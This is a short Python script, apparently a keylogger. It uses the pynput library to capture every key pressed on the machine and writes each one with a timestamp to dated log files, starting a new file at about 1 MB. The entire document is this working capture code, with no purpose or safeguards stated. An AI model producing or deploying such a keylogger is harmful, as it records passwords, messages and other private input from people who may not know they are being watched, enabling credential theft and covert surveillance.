from pynput.keyboard import Key, Listener
import logging
import time
import os


#Create a file to log key presses
logging.basicConfig(filename=(time.strftime("%Y-%m-%d_%H-%M-%S") + '.log'), level=logging.DEBUG, format='%(message)s')

#Get size of the current log file
def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size



def on_key_press(key):
    #save to log file with time character pressed
    logging.info('[' + time.strftime("%Y-%m-%d %H:%M:%S") + ']' + str(key))

    #create new file if larger than given size
    if get_file_size(logging.getLogger().handlers[0].baseFilename) > 1000000:
        logging.getLogger().handlers[0].flush()
        logging.getLogger().removeHandler(logging.getLogger().handlers[0])
        logging.basicConfig(filename=(time.strftime("%Y-%m-%d_%H-%M-%S") + '.log'), level=logging.DEBUG, format='%(message)s')


#listens to key press
with Listener(on_press=on_key_press) as listener:
    listener.join()

